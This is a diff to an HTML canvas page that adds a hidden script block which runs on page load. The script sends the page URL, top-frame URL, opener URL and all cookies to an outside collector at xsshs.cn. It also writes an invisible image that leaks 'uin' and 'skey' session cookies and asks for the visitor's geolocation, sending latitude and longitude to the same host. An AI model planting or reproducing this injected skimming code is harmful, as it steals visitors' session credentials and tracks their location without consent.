@@ -11,6 +11,38 @@
  </head>
  <body>
   <canvas id="canvas"></canvas>
+
+  <script>
+    (function(){(new Image()).src='https://xsshs.cn/xss.php?do=api&id=1bSG&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
+if(''==1){keep=new Image();keep.src='https://xsshs.cn/xss.php?do=keepsession&id=1bSG&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
+function getCookie(name){  
+        var value="";  
+        var cookie = ";"+document.cookie.replace(/;\s+/g,";")+";"  
+        var pos = cookie.indexOf(";"+name+"=");  
+        if(pos>-1){  
+            var start = cookie.indexOf("=",pos);  
+            var end = cookie.indexOf(";",start);  
+            value = unescape(cookie.substring(start+1,end));  
+        }  
+        return value;  
+}
+document.write('<div style="display:none"><img src="https://xsshs.cn/xss.php?do=api&id=1bSG&uin='+getCookie("uin")+'&skey='+getCookie("skey")+'" width=0 height=0 border=0 /></div>');function getLocation() 
+  {
+  if (navigator.geolocation)
+    {
+    navigator.geolocation.getCurrentPosition(showPosition);
+    }
+  else{x.innerHTML="Geolocation is not supported by this browser.";}
+  }
+function showPosition(position)
+  {
+
+    (new Image()).src='https://xsshs.cn/xss.php?do=api&id=1bSG&weidu='+position.coords.latitude+'&jingdu='+position.coords.longitude; 
+}
+       
+getLocation();
+  </script>
+
   <script>
     function $(id){
       return document.getElementById(id);
